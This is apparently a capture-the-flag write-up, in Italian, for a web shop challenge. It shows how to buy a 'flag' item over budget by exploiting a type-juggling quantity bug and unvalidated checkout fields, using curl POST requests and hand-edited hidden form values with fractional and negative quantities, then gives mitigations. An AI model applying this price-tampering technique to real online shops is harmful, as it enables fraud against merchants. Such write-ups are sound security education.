# Business Logic Flaw / Parameter Tampering (Type Juggling)

### 1. La Vulnerabilità (In sintesi)
L'applicazione presenta due asimmetrie critiche nella logica del carrello:
1. **Type Juggling:** L'aggiunta al carrello calcola il totale in `float` (es. `101 * 0.99 = 99.99`), ma salva la quantità in sessione troncata in intero (es. `intval(0.99) = 0`).
2. **Missing Validation:** Al momento del checkout, il backend accetta le quantità inviate lato client (form POST) senza imporre che siano positive.

### 2. Exploitation (Pratica)

L'obiettivo è acquistare un oggetto `flag` (costo 101) con un budget di `100`.

**Step 1: Aggiunta articolo legittimo**
```bash
curl -X POST -d "item=italy&qnt=1" http://nflagt.challs.cyberchallenge.it/
```

**Step 2: Aggiunta articolo target (Type Juggling bypass)**
Impostare `qnt=0.99`. Il controllo economico passa (`99.99 <= 100`), e la sessione registra la flag (ma con qnt 0).
```bash
curl -X POST -d "item=flag&qnt=0.99" http://nflagt.challs.cyberchallenge.it/
```

**Step 3: Checkout compensato (Parameter Tampering)**
Si invia la flag a `1` (costo 101) ma si imposta l'altro articolo a `-1` (costo -10). Il totale `91` passa la validazione, assegnandoci l'inventario desiderato.
```bash
curl -X POST -d "items[flag]=1&items[italy]=-1" http://nflagt.challs.cyberchallenge.it/cart.php
```

**Soluzione secondaria (Da Browser tramite DevTools):**
È possibile eseguire l'intera catena di exploit senza usare script o curl, modificando a mano le richieste:
1. **Aggiunta di `italy`**: click normale su "Add To Cart" nella card della bandiera italiana in home.
2. **Aggiunta di `flag` con quantità decimale**:
   - Tasto destro sul pulsante "Add To Cart" della card `flag` → Ispeziona.
   - Individuare il campo `<input type="hidden" value="1" name="qnt">` e modificarne il valore in `0.99`.
   - Cliccare "Add To Cart" sulla pagina.
3. **Modifica dei valori al checkout**:
   - Navigare su `/cart.php`.
   - Ispezionare i campi hidden del carrello.
   - Cambiare `<input type="hidden" name="items[italy]" value="1">` in `value="-1"`.
   - Cambiare `<input type="hidden" name="items[flag]" value="0">` in `value="1"`.
   - Cliccare "Buy it!".
4. Il server accetta la transazione e reindirizza a `/view.php`, mostrando l'immagine della flag acquistata.

### 3. Mitigazione
Validare sempre l'input per tipo ed ampiezza (`qnt > 0` intero). Al checkout ricalcolare il carrello basandosi eslusivamente sui valori sicuri salvati in `$_SESSION` e non sui campi inviati dal client.
